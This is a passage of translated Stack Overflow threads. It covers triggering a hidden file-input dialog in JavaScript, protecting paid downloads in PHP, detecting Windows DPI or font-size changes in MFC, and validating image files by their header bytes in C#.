    // This works in IE only. Doesn't do jack in FF. :( 
    var browseField = document.getElementById("uploadForm").file;
    browseField.click();
} 
```

* * *

## 回答 #7

> 赞同：9
> 
> 时间：2010-10-24T14:03:29.503

试试这个解决方案：[http ://code.google.com/p/upload-at-click/](http://code.google.com/p/upload-at-click/)

* * *

## 回答 #8

> 赞同：7
> 
> 时间：2011-12-27T12:29:39.660

如果您希望该`click`方法适用于 Chrome、Firefox 等，请将以下样式应用于您的输入文件。它将被完美隐藏，就像你做一个`display: none;`

```
#fileInput {
    visibility: hidden;
    position: absolute;
    top: 0;
    left: -5000px;
} 
```

就这么简单，我测试了它的工作原理！

* * *

## 回答 #9

> 赞同：5
> 
> 时间：2012-10-10T15:08:15.897

```
$(document).one('mousemove', function() { $(element).trigger('click') } ); 
```

当我遇到类似问题时为我工作，这是一个普通的 eRube Goldberg。

* * *

## 回答 #10

> 赞同：4
> 
> 时间：2012-10-10T19:25:25.687

> ***工作解决方案***

让我在这篇旧文章中添加一个我曾经使用过的有效解决方案，它可能适用于所有新旧浏览器的 80% 或更多。

解决方案既复杂又简单。第一步是使用 CSS 并使用“under-elements”来显示输入文件类型，因为它的不透明度为 0。下一步是使用 JavaScript 根据需要更新其标签。

> **HTML** [*如果您想要一种快速访问特定元素的方法，只需插入 ID，但是类是必须的，因为它们与设置整个过程的 CSS 相关*]

```
<div class="file-input wrapper">
    <input id="inpFile0" type="file" class="file-input control" />
    <div class="file-input content">
        <label id="inpFileOutput0" for="inpFileButton" class="file-input output">Click Here</label>
        <input id="inpFileButton0" type="button" class="file-input button" value="Select File" />
    </div>
</div> 
```

> CSS[*请记住，颜色和字体样式等完全是你的偏好，如果你使用这个基本的 CSS，你可以随时使用尾部标记来随意设置样式，这在最后列出的 jsFiddle 中显示。*]

```
.file-test-area {
    border: 1px solid;
    margin: .5em;
    padding: 1em;
}
.file-input {
    cursor: pointer !important;
}
.file-input * {
    cursor: pointer !important;
    display: inline-block;
}
.file-input.wrapper {
    display: inline-block;
    font-size: 14px;
    height: auto;
    overflow: hidden;
    position: relative;
    width: auto;
}
.file-input.control {
    -moz-opacity:0 ;
    filter:alpha(opacity: 0);
    opacity: 0;

    height: 100%;
    position: absolute;
    text-align: right;
    width: 100%;
    z-index: 2;
}
.file-input.content {
    position: relative;
    top: 0px;
    left: 0px;
    z-index: 1;
}
.file-input.output {
    background-color: #FFC;
    font-size: .8em;
    padding: .2em .2em .2em .4em;
    text-align: center;
    width: 10em;
}
.file-input.button {
    border: none;
    font-weight: bold;
    margin-left: .25em;
    padding: 0 .25em;
} 
```

> **JavaScript** [*纯粹而真实，然而，一些较旧（已退役）的浏览器可能仍然存在问题（例如 Netscrape 2！）*]

```
var inp = document.getElementsByTagName('input');
for (var i=0;i<inp.length;i++) {
    if (inp[i].type != 'file') continue;
    inp[i].relatedElement = inp[i].parentNode.getElementsByTagName('label')[0];
    inp[i].onchange /*= inp[i].onmouseout*/ = function () {
        this.relatedElement.innerHTML = this.value;
    };
}; 
```

# [工作 jsFiddle 示例](http://jsfiddle.net/SpYk3/8fTfY/)

* * *

## 回答 #11

> 赞同：4
> 
> 时间：2013-12-28T02:28:46.847

**有用 ：**

出于安全原因，在 Firefox 和 Opera 上，您不能点击文件输入，但您可以使用 MouseEvents 进行模拟：

```
<script>
click=function(element){
    if(element!=null){
        try {element.click();}
        catch(e) {
            var evt = document.createEvent("MouseEvents");
            evt.initMouseEvent("click",true,true,window,0,0,0,0,0,false,false,false,false,0,null);
            element.dispatchEvent(evt);
            }
        }
    };
</script>

<input type="button" value="upload" onclick="click(document.getElementById('inputFile'));"><input type="file" id="inputFile" style="display:none"> 
```

* * *

## 回答 #12

> 赞同：4
> 
> 时间：2014-07-30T02:20:36.203

我知道这是旧的，所有这些解决方案都是围绕浏览器安全预防措施的黑客攻击，具有真正的价值。

也就是说，截至今天，fileInput.click() 适用于当前的 Chrome (36.0.1985.125 m) 和当前的 Firefox ESR (24.7.0)，但不适用于当前的 IE (11.0.9600.17207)。在按钮顶部覆盖不透明度为 0 的文件字段是可行的，但我想要一个链接元素作为可见触发器，并且悬停下划线在任何浏览器中都不起作用。它闪烁然后消失，可能浏览器正在考虑悬停样式是否实际适用。

但我确实找到了适用于所有这些浏览器的解决方案。我不会声称已经测试了每个浏览器的每个版本，或者我知道它会永远继续工作，但它现在似乎满足了我的需求。

很简单：将文件输入字段放置在屏幕外（位置：绝对；顶部：-5000px），在其周围放置一个标签元素，然后触发对标签的点击，而不是文件字段本身。

请注意，链接确实需要编写脚本以调用标签的 click 方法，它不会自动执行此操作，例如当您单击标签元素内的文本时。显然，链接元素捕获了点击，它没有通过标签。

另请注意，这不提供显示当前选定文件的方法，因为该字段不在屏幕上。我想在选择文件后立即提交，所以这对我来说不是问题，但如果您的情况不同，您将需要一种不同的方法。

* * *

## 回答 #13

> 赞同：4
> 
> 时间：2014-10-31T18:35:44.233

JS 小提琴：http: [//jsfiddle.net/eyedean/1bw357kw/](http://jsfiddle.net/eyedean/1bw357kw/)

```
popFileSelector = function() {
    var el = document.getElementById("fileElem");
    if (el) {
        el.click();  
    }
};

window.popRightAway = function() {
    document.getElementById('log').innerHTML += 'I am right away!<br />';
    popFileSelector();
};

window.popWithDelay = function() {
    document.getElementById('log').innerHTML += 'I am gonna delay!<br />';
    window.setTimeout(function() {
        document.getElementById('log').innerHTML += 'I was delayed!<br />';
        popFileSelector();
    }, 1000);
};
```

```
<body>
  <form>
      <input type="file" id="fileElem" multiple accept="image/*" style="display:none" onchange="handleFiles(this.files)" />
  </form>
  <a onclick="popRightAway()" href="#">Pop Now</a>
    <br />
  <a onclick="popWithDelay()" href="#">Pop With 1 Second Delay</a>
    <div id="log">Log: <br /></div>
</body>
```

* * *

## 回答 #14

> 赞同：3
> 
> 时间：2011-09-10T18:34:39.267

这段代码对我有用。这是你想要做的吗？

```
<input type="file" style="position:absolute;left:-999px;" id="fileinput" />
<button  id="addfiles" >Add files</button>

<script language="javascript" type="text/javascript">
   $("#addfiles").click(function(){
      $("#fileinput").click();
   });
</script> 
```

* * *

## 回答 #15

> 赞同：3
> 
> 时间：2012-03-07T17:42:10.963

我使用 jQuery 和 jQuery-ui 的 Safari 解决方案：

```
$("<input type='file' class='ui-helper-hidden-accessible' />").appendTo("body").focus().trigger('click'); 
```

* * *

## 回答 #16

> 赞同：3
> 
> 时间：2015-12-08T14:25:14.763

这是针对此问题的纯 JavaScript 解决方案。适用于所有浏览器

```
<script>
    function upload_image_init(){
        var elem = document.getElementById('file');
        if(elem && document.createEvent) {
           var evt = document.createEvent("MouseEvents");
           evt.initEvent("click", true, false);
           elem.dispatchEvent(evt);
        }
    }
</script> 
```

* * *

## 回答 #17

> 赞同：2
> 
> 时间：2008-10-17T01:30:24.553

有一些方法可以将事件重定向到控件，但不要期望自己能够轻松地将事件触发到火控，因为浏览器会出于（良好的）安全原因尝试阻止它。

如果您只需要在用户单击某些内容时显示文件对话框，比方说因为您想要更好看的文件上传按钮，那么您可能想看看[Shaun Inman 想出了什么](http://www.shauninman.com/archive/2007/09/10/styling_file_inputs_with_css_and_the_dom)。

我已经能够通过在 keydown、keypress 和 keyup 事件之间创造性地转移焦点进出控制来实现键盘触发。YMMV。

我真诚的建议是不要管它，因为这是一个浏览器不兼容痛苦的世界。较小的浏览器更新也可能会在没有警告的情况下阻止技巧，您可能必须不断重新发明黑客以使其正常工作。

* * *

## 回答 #18

> 赞同：2
> 
> 时间：2009-04-29T17:21:51.047

前段时间我正在研究这个，因为我想创建一个自定义按钮来打开文件对话框并立即开始上传。我刚刚注意到一些可能使这成为可能的东西 - 当您单击上传的任意位置时，firefox 似乎会打开对话框。所以以下可能会这样做：

1.  创建文件上传和包含要用作按钮的图像的单独元素
2.  安排它们重叠并使文件元素背景和边框透明，因此按钮是唯一可见的东西
3.  添加 javascript 以使 IE 在单击按钮/文件输入时打开对话框
4.  选择文件时使用 onchange 事件提交表单

这只是理论上的，因为我已经使用了另一种方法来解决问题，但它可能会起作用。

* * *

## 回答 #19

> 赞同：2
> 
> 时间：2011-12-02T09:43:58.863

我有一个`<input type="button">`隐藏的标签。我所做的是将`"onClick"`事件附加到任何类型的任何可见组件，例如标签。这是使用 Google Chrome 的开发者工具或 Mozilla Firefox 的 Firebug 使用右键单击“编辑 HTML”命令来完成的。在这种情况下，请指定以下脚本或类似内容：

如果你有 JQuery：

```
$('#id_of_component').click(); 
```

如果不：

```
document.getElementById('id_of_component').click(); 
```

谢谢。

* * *

## 回答 #20

> 赞同：2
> 
> 时间：2016-07-01T07:16:44.467

嘿，这个解决方案有效。下载我们应该使用 MSBLOB

```
$scope.getSingleInvoicePDF = function(invoiceNumberEntity) {
   var fileName = invoiceNumberEntity + ".pdf";
   var pdfDownload = document.createElement("a");
   document.body.appendChild(pdfDownload);

   AngularWebService.getFileWithSuffix("ezbillpdfget",invoiceNumberEntity,"pdf" ).then(function(returnedJSON) {
       var fileBlob = new Blob([returnedJSON.data], {type: 'application/pdf'});
       if (navigator.appVersion.toString().indexOf('.NET') > 0) { // for IE browser
           window.navigator.msSaveBlob(fileBlob, fileName);
       } else { // for other browsers
           var fileURL = window.URL.createObjectURL(fileBlob);
           pdfDownload.href = fileURL;
           pdfDownload.download = fileName;
           pdfDownload.click();      
       }
   });
}; 
```

对于 AngularJS 甚至是普通的 javascript。

* * *

## 回答 #21

> 赞同：1
> 
> 时间：2011-02-10T21:35:23.997

现在这在 Firefox 4 中是可能的，但需要注意的是它被视为一个弹出窗口，因此只要有弹出窗口就会被阻止。

* * *

## 回答 #22

> 赞同：1
> 
> 时间：2011-09-25T20:22:41.380

这是对我有用的解决方案： **CSS：**

```
#uploadtruefield {
    left: 225px;
    opacity: 0;
    position: absolute;
    right: 0;
    top: 266px;
    opacity:0;
    -moz-opacity:0;
    filter:alpha(opacity:0);
    width: 270px;
    z-index: 2;
}

.uploadmask {
    background:url(../img/browse.gif) no-repeat 100% 50%;
}
#uploadmaskfield{
    width:132px;
} 
```

**带有“小”JQuery 帮助的 HTML：**

```
<div class="uploadmask">
    <input id="uploadmaskfield" type="text" name="uploadmaskfield">
</div>
<input id="uploadtruefield"  type="file" onchange="$('#uploadmaskfield').val(this.value)" > 
```

*只要确保真正的上传字段完全覆盖了 maskfied 即可。*

* * *

## 回答 #23

> 赞同：1
> 
> 时间：2012-12-09T02:39:50.163

您可以按照[<a> 标签上的打开文件对话框中的答案执行此操作](https://stackoverflow.com/questions/10216331/open-file-diaglog-box-on-a-tag)

```
<input type="file" id="upload" name="upload" style="visibility: hidden; width: 1px;     height: 1px" multiple />
<a href="" onclick="document.getElementById('upload').click(); return false">Upload</a> 
```

* * *

## 回答 #24

> 赞同：1
> 
> 时间：2013-01-24T11:28:51.077

我发现如果 input(file) 在表单之外，那么触发 click 事件会调用文件对话框。

* * *

## 回答 #25

> 赞同：1
> 
> 时间：2013-09-11T20:18:16.387

希望这对某人有所帮助 - 我花了 2 个小时来敲敲它：

在 IE8 或 IE9 中，如果您以任何方式触发使用 javascript 打开文件输入（相信我，我已经尝试过所有这些），它不会让您使用 javascript 提交表单，它只会默默地失败。

通过常规提交按钮提交表单可能有效，但调用 form.submit(); 会默默地失败。

我不得不求助于用透明的文件输入覆盖我的选择文件按钮。

* * *

## 回答 #26

> 赞同：1
> 
> 时间：2014-03-03T11:53:30.220

这对我有用：

```
<script>
    function sel_file() {
        $("input[name=userfile]").trigger('click');
    }  
</script>

<input type="file" name="userfile" id="userfile" />

<a href="javascript:sel_file();">Click</a> 
```

* * *

## 回答 #27

> 赞同：1
> 
> 时间：2015-10-03T00:28:56.787

这并非不可能：

```
var evObj = document.createEvent('MouseEvents');
evObj.initMouseEvent('click', true, true, window);  
setTimeout(function(){ document.getElementById('input_field_id').dispatchEvent(evObj); },100); 
```

但不知何故，它只有在通过点击事件调用的函数中才有效。

所以你可能有以下设置：

html:

```
<div onclick="openFileChooser()" class="some_fancy_stuff">Click here to open image chooser</div>
<input type="file" id="input_img"> 
```

JavaScript：

```
 function openFileChooser() {
      var evObj = document.createEvent('MouseEvents');
      evObj.initMouseEvent('click', true, true, window);  
      setTimeout(function()
      { 
        document.getElementById('input_img').dispatchEvent(evObj);      
      },100);      
    } 
```

* * *

## 回答 #28

> 赞同：0
> 
> 时间：2016-03-29T09:58:25.633

您可以使用

```
<button id="file">select file</button>
<input type="file" name="file" id="file_input" style="display:none;">
<script>
$('#file').click(function() {
        $('#file_input').focus().trigger('click');
    });
</script> 
```

* * *

## 回答 #29

> 赞同：0
> 
> 时间：2021-07-23T09:21:02.910

为此，您可以单击文件输入上方的不可见的传递元素：

```
function simulateFileClick() {
  const div = document.createElement("div")
  div.style.visibility = "hidden"
  div.style.position = "absolute"
  div.style.width = "100%"
  div.style.height = "100%"
  div.style.pointerEvents = "none"
  const fileInput = document.getElementById("fileInput") // or whatever selector you like
  fileInput.style.position = "relative"
  fileInput.appendChild(div)
  const mouseEvent = new MouseEvent("click")
  div.dispatchEvent(mouseEvent)
} 
```

# php - 限制文件下载

> ID：210645
> 
> 赞同：4
> 
> 时间：2008-10-16T23:31:57.833
> 
> 标签：php, file, download

我目前正在为一个基本上涉及销售各种文件的客户创建一个网站。这显然是一件很常见的事情，这让我觉得有点愚蠢，因为我没有想到一种方法来做这件事。

购买完成后，客户应被带到包含下载链接的页面，并接收包含下载链接的电子邮件和包含将为他们创建的帐户信息的电子邮件（他们也将能够从他们帐户的控制面板下载）。我想弄清楚的是如何隐藏/隐藏文件在我的服务器上的位置，以便购买它的人不能简单地将直接链接复制并粘贴到其他地方的文件。即使我请求下载文件的链接格式为[http://example.com/blah/download/454643](http://example.com/blah/download/454643)，一个与文件实际位置不对应的URL，我认为仍然可以在服务器上找到该文件？我不太了解权限如何在我的服务器上工作，这就是我问的原因。提前致谢 ：）

* * *

## 回答 #1

> 赞同：8
> 
> 时间：2008-10-16T23:40:38.487

您基本上不会向用户提供文件的直接 URL。基于服务器的权限在这里无关。

假设您已将所需文件保存在 /data/files/file.pdf 中（将文件存储在 Web 根目录之外的良好做法）。您可以为用户提供一个类似于 /download.php?auth=32 的下载链接

当用户单击链接时，download.php 将检查会话/cookie 是否经过身份验证以及下载 ID 是否有效（如果您有基于时间的下载到期）然后 download.php 将从其位置读取所需文件并发送将其发送到带有适当标题的浏览器以强制下载。

* * *

## 回答 #2

> 赞同：5
> 
> 时间：2008-10-17T07:37:10.100

将文件存储在您的 Web 根目录之外，但请确保您存储它们的文件夹位于 php.ini 文件的“open_basedir”指令中，这将允许您从 PHP 脚本访问它们。将它们存储在 Web 根目录之外意味着它们永远不会通过 HTTP 直接访问。

有一个 PHP 脚本，就像这些答案中列出的可以流式传输/读出文件的脚本一样。如果它是一个大文件，您可能需要更改“max_execution_time”以考虑脚本读取文件所需的额外时间。此脚本将允许您对用户进行身份验证并检查他们是否已为文件付费。

将 .htacces 放入包含脚本的文件夹中，该脚本将从该文件夹请求的文件重写为变量。这使得他们看起来好像是在直接访问该文件，而实际上并非如此。就个人而言，我只会将单个脚本放在此文件夹中，以保持简单。所以：

> [http://www.yourdomain.com/files/expensive_song.mp3](http://www.yourdomain.com/files/expensive_song.mp3)

实际上重写为：

> [http://www.yourdomain.com/files/download_file.php?filename=expensive_song.mp3](http://www.yourdomain.com/files/download_file.php?filename=expensive_song.mp3)

祝你好运。

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2008-10-17T01:32:21.773

如果您有权运行 Lighttpd，则绝对应该查看[Mod_SecDownload](http://redmine.lighttpd.net/wiki/lighttpd/Docs:ModSecDownload)模块。我在以前的安全销售视频和图像文件的项目中使用了它。

> 由于网络服务器对应用程序中使用的权限一无所知，因此每个知道该 URL 的用户都可以使用生成的 URL。
> 
> mod_secdownload 通过引入一种在指定时间内对 URL 进行身份验证的方法来消除此问题。应用程序必须生成一个令牌和一个时间戳，这些令牌和时间戳在允许网络服务器下载文件之前由网络服务器检查。
> 
> 生成的 URL 必须具有以下格式：
> 
> <uri-prefix>/<token>/<timestamp-in-hex>/<​​rel-path> 看起来像“yourserver.com/bf32df9cdb54894b22e09d0ed87326fc/435cc8cc/secure.tar.gz”
> 
> <token> 是一个 MD5
> 
> 1.  一个秘密字符串（用户提供）
> 2.  （以。。开始 /）
> 3.  <十六进制时间戳>
> 
> 如您所见，令牌根本没有绑定到用户。唯一的限制因素是用于在给定超时 (secdownload.timeout) 后使 URL 无效的时间戳。

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2011-11-18T09:53:07.833

一些网络服务器，例如 Lighty 和 Nginx，实现了 X-Sendfile 标头。假设您有一个 Django 应用程序，您可以让您的视图返回一个 X-Sendfile 标头，该标头指向您要发送的文件。然后 lighttpd 将改为提供该文件。

该文件可以位于 Web 不可访问的位置（这不是 301 重定向），并且由于您的应用正在提供标头，因此您可以先进行授权。

这比从您的应用程序中提供静态文件要好得多。网络服务器针对静态文件进行了优化，速度更快，资源更轻。如果您要处理多个请求，则应考虑使用 X-Sendfile。

这里有一篇很好的博客文章：

[http://blog.zacharyvoase.com/2009/09/08/sendfile/](http://blog.zacharyvoase.com/2009/09/08/sendfile/)

Lighttpd/PHP 指令可以在这里找到：

[http://redmine.lighttpd.net/wiki/1/X-LIGHTTPD-send-file](http://redmine.lighttpd.net/wiki/1/X-LIGHTTPD-send-file)

NGINX 指令可以在这里找到：

[http://wiki.nginx.org/XSendfile](http://wiki.nginx.org/XSendfile)

似乎还有一个早期发布的 Apache mod 做同样的事情：

[https://tn123.org/mod_xsendfile/](https://tn123.org/mod_xsendfile/)

* * *

## 回答 #5

> 赞同：1
> 
> 时间：2008-10-16T23:43:28.637

您可以将 URL 作为买方的授权代码。您让她再次登录，检查代码用于哪个文件，然后将文件通过管道发送给她。这是来自 osCommerce 的 PHP 代码示例（我很久以前写过）。

```
// Now send the file with header() magic
  header("Expires: Mon, 26 Nov 1962 00:00:00 GMT");
  header("Last-Modified: " . gmdate("D,d M Y H:i:s") . " GMT");
  header("Cache-Control: no-cache, must-revalidate");
  header("Pragma: no-cache");
  header("Content-Type: Application/octet-stream");
  header("Content-disposition: attachment; filename=" . $downloads['orders_products_filename']);

  if (DOWNLOAD_BY_REDIRECT == 'true') {
// This will work only on Unix/Linux hosts
    tep_unlink_temp_dir(DIR_FS_DOWNLOAD_PUBLIC);
    $tempdir = tep_random_name();
    umask(0000);
    mkdir(DIR_FS_DOWNLOAD_PUBLIC . $tempdir, 0777);
    symlink(DIR_FS_DOWNLOAD . $downloads['orders_products_filename'], DIR_FS_DOWNLOAD_PUBLIC . $tempdir . '/' . $downloads['orders_products_filename']);
    if (file_exists(DIR_FS_DOWNLOAD_PUBLIC . $tempdir . '/' . $downloads['orders_products_filename'])) {
      tep_redirect(tep_href_link(DIR_WS_DOWNLOAD_PUBLIC . $tempdir . '/' . $downloads['orders_products_filename']));
    }
  } 
```

* * *

## 回答 #6

> 赞同：1
> 
> 时间：2008-10-17T02:09:50.620

这是我为非常相似的事情所做的示例代码：

```
// $mimeType is the mime type of the file
header('Content-type: ' . $mimeType);
// this will get the size of the file
// (helps for giving the size to the browser so a percent complete can be shown)
header('Content-length: ' . (string) (filesize($path)));
// disposition is either attachment (for binary files that can't be read by the browser) 
// or inline (for files that can be read by the browser
// some times you have play with this to get working so users get the download window in all browsers
// original filename is the name you want to users to see 
// (shouldn't have any special characters as you can end up with weird issues)
header('Content-Disposition: ' . $disposition . '; filename=' . $originalFilename);
// the next 2 lines try to help the browser understand that the file can't be cached
// and should be downloaded (not viewed)
header('Pragma: Public');
header('Cache-control: private');
// this will output the file to browser
readfile($path); 
```

您当然可以添加任何登录检查和日志记录，以确保它不会被下载太多次。

此外，如前所述，确保将文件放在 Web 服务器文档根目录之外（或之上），这样人们就无法找出路径。或者您甚至可以在目录上设置密码，这样只有内部人员才能更轻松地访问文件列表，但不推荐这样做。（仅当您可以将某些内容放在 doc 根目录之外时才执行此操作。）

* * *

## 回答 #7

> 赞同：0
> 
> 时间：2008-10-16T23:38:08.493

我见过的很多基于购买的下载 url 倾向于使用一些 guid 和其他动态信息作为 url 的一部分，而不是像猜测一个 id 那样简单。您最终可能会使用 guid/datetimepurchased/id 或类似的东西作为路径的一部分。

另一个选项是确保用户在允许下载继续之前登录，这将提供额外的安全层。

* * *

## 回答 #8

> 赞同：0
> 
> 时间：2008-10-16T23:39:16.603

好吧，首先，您绝对不想直接链接到该文件。如果满足某些条件，您可能希望使用生成的 id 参数向用户发送指向您创建的服务（甚至只是一个页面）的链接，该参数会导致文件下载。

确实，这些标准很困难，因为您需要允许用户多次下载文件（以防他第一次下载完整文件失败，或意外删除文件等），但一旦链接有效，它一直有效，直到你杀死它。

我建议使用时间或 IP 来过滤您的下载请求。

时间：当有人从您那里购买文件时，通知他们他们只能下载 1 天的文件，或类似的时间。是的，其他人可以在当天下载该文件，但只能下载 1 天。您也可以对此设置下载限制，因此他们只能下载5次（这是正常的）。

IP：当有人从您那里购买文件时，通知他们他们只能从该 IP 下载文件。当他们尝试下载文件时，您的下载服务当然可以检查这一点。

两者似乎也很容易同时使用。

在任何一种情况下（或两者兼有），准备处理没有及时下载文件的客户，或者想在时间限制后再次获取（或从另一台计算机/IP（有些人没有得到静态的）） ）。他们不想再付钱，而且可能不应该付钱。

# c++ - 无法检测 Windows 字体大小何时更改 C++ MFC

> ID：210646
> 
> 赞同：8
> 
> 时间：2008-10-16T23:32:10.003
> 
> 标签：c++, winapi, mfc, font-size, system-font

我正在尝试确定如何检测用户何时将 Windows 字体大小从普通字体更改为特大字体，通过在 Windows XP 机器上执行以下步骤来选择字体大小：

1.  右键单击桌面并选择属性。
2.  单击外观选项卡。
3.  选择字体大小：普通/大字体/超大字体

我的理解是字体大小的变化会导致 DPI 的变化，所以这是我到目前为止所尝试的。

* * *

## 我的目标：

我想检测**Windows 字体大小**何时从普通字体更改为大字体或超大字体，并根据该字体大小更改采取一些措施。我假设当 Windows Font Size 改变时，DPI 也会改变（尤其是当大小是 Extra Large Fonts

* * *

## 到目前为止我已经尝试过：

我收到了几条消息，包括：WM_SETTINGCHANGE、WM_NCCALCSIZE、WM_NCPAINT 等……但是这些消息都不是字体大小更改时所特有的，换句话说，当我收到 WM_SETTINGSCHANGE 消息时，我想知道发生了什么变化。

理论上，当我定义 OnSettingChange 并且 Windows 调用它时，lpszSection 应该告诉我正在更改的部分是什么，并且工作正常，但随后我通过调用 SystemParametersInfo 检查给定部分并传入操作 SPI_GETNONCLIENTMETRICS，然后逐步执行调试器和我确保我观察返回的 NONCLIENTMETRICS 中的数据是否有任何字体更改，但没有发生任何字体更改。

即使这不起作用，我应该仍然能够在设置更改时检查 DPI。我真的不会关心其他细节，每次收到 WM_SETTINGCHANGE 消息时，我都会检查 DPI 并执行我感兴趣的操作，但我也无法获得系统 DPI。

我试图通过调用 GetSystemMetrics 方法来获取 DPI，也适用于每个 DC：

Dekstop DC->GetDeviceCaps LOGPIXELSX/LOGPIXELSY 窗口 DC->GetDeviceCaps LOGPIXELSX/LOGPIXELSY 当前 DC->GetDeviceCaps LOGPIXELSX/LOGPIXELSY

即使我在图形属性窗口中更改 DPI，这些值也不会返回任何不同，它们总是显示 96。

有人可以帮我解决这个问题吗？我应该寻找什么？我应该在哪里看？

```
afx_msg void CMainFrame::OnSettingChange(UINT uFlags, LPCTSTR lpszSection)
{
    int windowDPI = 0;
    int deviceDPI = 0;
    int systemDPI = 0;
    int desktopDPI = 0;
    int dpi_00_X = 0;
    int dpi_01_X = 0;
    int dpi_02_X = 0;
    int dpi_03_X = 0;

    CDC* windowDC = CWnd::GetWindowDC(); // try with window DC
    HDC desktop = ::GetDC(NULL); // try with desktop DC
    CDC* device = CWnd::GetDC(); // try with current DC
    HDC hDC = *device; // try with HDC
    if( windowDC )
    {
        windowDPI = windowDC->GetDeviceCaps(LOGPIXELSY); 
        // always 96 regardless if I change the Font 
        // Size to Extra Large Fonts or keep it at Normal

        dpi_00_X = windowDC->GetDeviceCaps(LOGPIXELSX); // 96
    }

    if( desktop )
    {
        desktopDPI = ::GetDeviceCaps(desktop, LOGPIXELSY); // 96
        dpi_01_X = ::GetDeviceCaps(desktop, LOGPIXELSX); // 96
    }

    if( device )
    {
        deviceDPI = device->GetDeviceCaps(LOGPIXELSY); // 96
        dpi_02_X = device->GetDeviceCaps(LOGPIXELSX); // 96
    }

    systemDPI = ::GetDeviceCaps(hDC, LOGPIXELSY); // 96
    dpi_03_X = ::GetDeviceCaps(hDC, LOGPIXELSX); // 96

    CWnd::ReleaseDC(device);
    CWnd::ReleaseDC(windowDC);
    ::ReleaseDC(NULL, desktop);
    ::ReleaseDC(NULL, hDC);

    CWnd::OnWinSettingChange(uFlags, lpszSection);
} 
```

DPI 始终返回 96，但当我将字体大小更改为超大字体或将 DPI 更改为 120（从图形属性）时，设置更改才会生效。

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2008-10-17T12:46:58.527

[重读后编辑]我几乎肯定更改为“大字体”不会导致 DPI 更改，而是主题设置。您应该能够通过应用“大字体”更改然后打开 DPI 设置所在的高级显示属性来验证，它应该保持在 96dpi。

* * *

DPI 更改应该需要重新启动。也许该设置尚未传播到 GetDeviceCaps 可以检索它的地方？

也许尝试更改不需要重新启动的设置（也许是分辨率），然后看看您是否可以检测到更改。如果可以，您的答案可能是直到重新启动后才能检测到 DPI 变化。

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2008-10-17T11:25:41.357

当您在 Desktop DC 上调用 GetDeviceCaps() 时，您是否使用了可能被 MFC 缓存并因此包含过期信息的 DC？您是否从 OnSettingsChange 处理程序内部同步调用 GetDeviceCaps()？我可以看到这些东西中的一个或两个可能如何让您获得过时的 DPI 版本。

Raymond Chen[写了这篇文章](https://devblogs.microsoft.com/oldnewthing/20040714-00/?p=38443)，他的解决方案看起来像这样（请注意，我添加了 :: 运算符以避免调用 API 的 MFC 包装器）：

```
int GetScreenDPI()
{
  HDC hdcScreen = ::GetDC(NULL);
  int iDPI = -1; // assume failure
  if (hdcScreen) {
    iDPI = ::GetDeviceCaps(hdcScreen, LOGPIXELSX);
    ::ReleaseDC(NULL, hdcScreen);
  }
  return iDPI;
} 
```

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2008-10-17T18:36:09.087

我有预感 WM_THEMECHANGED 会照顾你。不过，它没有任何关于发生了什么变化的暗示。您必须使用 OpenThemeData 并缓存初始设置，然后在每次收到消息时进行比较。

您可能不需要关心发生了什么变化，难道您不能有一个通用的布局例程来调整您的表单/对话框/任何东西，通过考虑所有内容并假设从头开始？

你想解决什么问题？

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2008-11-12T22:53:59.900

请参阅[http://msdn.microsoft.com/en-us/library/ms701681(VS.85).aspx](http://msdn.microsoft.com/en-us/library/ms701681(VS.85).aspx)，此处对此进行了解释（引用：“如果不取消 dpi 缩放，此调用将返回默认值 96 dpi。”）

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2008-10-17T18:47:37.330

我认为字体大小更改时显示 DPI 不会更改。Windows 可能只是将`WM_PAINT`and`WM_NCPAINT`消息发送到所有打开的窗口，并且它们正在使用当前（现在很大）系统字体重新绘制自己。

* * *

## 回答 #6

> 赞同：0
> 
> 时间：2009-06-26T20:10:53.250

查看注册表中的这些值：

Windows XP Theme HKCU\Software\Microsoft\Windows\CurrentVersion\ThemeManager\SizeName 可能的值：NormalSize、LargeFonts 和 ExtraLargeFonts 这些值与**语言无关**。

Windows Classic Theme HKCU\Control Panel\Appearance\Current 可能的值：Windows Classic、Windows Classic（大）、Windows Classic（特大）、Windows Standard、Windows Standard（大）、Windows Standard（特大） 请注意，这些值是**语言相关**。

Windows Vista 不支持此功能。如果我们想要更大的字体，只需更改 DPI 设置。在这种情况下，GetDeviceCaps 应该可以工作。

希望这可以帮助。

# c# - 在 C# 中验证文件中的图像

> ID：210650
> 
> 赞同：54
> 
> 时间：2008-10-16T23:33:56.443
> 
> 标签：c#, .net, image, file-io

我正在从文件中加载图像，并且我想知道如何在从文件中完全读取图像之前对其进行验证。

```
string filePath = "image.jpg";
Image newImage = Image.FromFile(filePath); 
```

当 image.jpg 不是真正的 jpg 时，就会出现问题。例如，如果我创建一个空文本文件并将其重命名为 image.jpg，则在加载 image.jpg 时会抛出 OutOfMemory Exception。

我正在寻找一个函数来验证给定图像的流或文件路径的图像。

示例函数原型

```
bool IsValidImage(string fileName);
bool IsValidImage(Stream imageStream); 
```

* * *

## 回答 #1

> 赞同：84
> 
> 时间：2012-02-25T16:59:19.643

这是我的图像检查。我不能依赖文件扩展名，必须自己检查格式。我正在从字节数组中加载 WPF 中的 BitmapImages，并且不知道预先的格式。WPF 可以很好地检测格式，但不会告诉您 BitmapImage 对象的图像格式（至少我不知道这个属性）。而且我不想再次使用 System.Drawing 加载图像来检测格式。这个解决方案速度很快，对我来说效果很好。

```
public enum ImageFormat
{
    bmp,
    jpeg,
    gif,
    tiff,
    png,
    unknown
}

public static ImageFormat GetImageFormat(byte[] bytes)
{
    // see http://www.mikekunz.com/image_file_header.html  
    var bmp    = Encoding.ASCII.GetBytes("BM");     // BMP
    var gif    = Encoding.ASCII.GetBytes("GIF");    // GIF
    var png    = new byte[] { 137, 80, 78, 71 };    // PNG
    var tiff   = new byte[] { 73, 73, 42 };         // TIFF
    var tiff2  = new byte[] { 77, 77, 42 };         // TIFF
    var jpeg   = new byte[] { 255, 216, 255, 224 }; // jpeg
    var jpeg2  = new byte[] { 255, 216, 255, 225 }; // jpeg canon

    if (bmp.SequenceEqual(bytes.Take(bmp.Length)))
        return ImageFormat.bmp;

    if (gif.SequenceEqual(bytes.Take(gif.Length)))
        return ImageFormat.gif;

    if (png.SequenceEqual(bytes.Take(png.Length)))
        return ImageFormat.png;

